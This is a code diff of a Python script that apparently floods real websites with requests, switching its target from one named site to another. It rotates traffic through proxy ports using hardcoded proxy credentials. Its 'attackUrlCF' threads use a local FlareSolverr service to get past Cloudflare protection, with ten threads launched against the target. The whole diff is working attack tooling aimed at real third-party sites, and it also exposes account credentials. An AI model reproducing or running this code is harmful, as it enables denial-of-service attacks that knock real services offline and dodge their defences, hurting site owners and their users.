@@ -13,11 +13,11 @@ letters = string.ascii_lowercase
 PORT=10000
 PROXY_USER = 'spcmp28zj1' 
 PROXY_PASS = '123123123'
-PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@all.dc.smartproxy.com:PORT'
+PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@uk.dc.smartproxy.com:PORT'
 
 attackList = [
-# 'https://www.business2community.com',
-'https://x-bitcoin-club.com'
+'https://www.business2community.com',
+# 'https://x-bitcoin-club.com'
 ]
 
 def checkIp(proxies):
@@ -36,7 +36,7 @@ def checkmyHeaders():
 	input()
 
 def changeProxies():
-	PORT=random.randrange(10001,32048)
+	PORT=random.randrange(20001,22048)
 	PROXY_URL = PROXY_URL_BASE.replace('PORT',str(PORT))
 
 	proxies = {
@@ -134,7 +134,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(10):
-	Thread(target=attackUrlCF, args=['https://x-bitcoin-club.com', i]).start()
+	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
 	time.sleep(30)
 input()
 
